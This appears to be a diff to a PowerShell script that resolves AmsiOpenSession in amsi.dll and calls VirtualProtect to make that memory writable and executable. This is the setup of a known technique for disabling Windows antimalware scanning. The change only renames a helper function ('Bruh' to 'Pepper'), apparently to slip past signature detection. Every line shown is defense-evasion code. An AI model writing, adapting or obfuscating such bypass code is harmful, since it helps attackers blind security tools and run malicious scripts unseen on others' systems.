@@ -1,4 +1,4 @@
-function Bruh {
+function Pepper {
     Param ($Bruhh, $wowzers)
 
     $howmany = ([AppDomain]::CurrentDomain.GetAssemblies() |
@@ -38,9 +38,9 @@ function Ihaveto {
 
 }
 
-[IntPtr]$Muffins = Bruh amsi.dll AmsiOpenSession
+[IntPtr]$Muffins = Pepper amsi.dll AmsiOpenSession
 $itisvery = 0
-$veryfrustrating=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Bruh `
+$veryfrustrating=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Pepper `
 kernel32.dll VirtualProtect), (Ihaveto @([IntPtr], [Uint32], [Uint32], 
 [Uint32].MakeByRefType()) ([Bool])))
 $veryfrustrating.Invoke($Muffins, 3, 0x40, [ref]$itisvery)
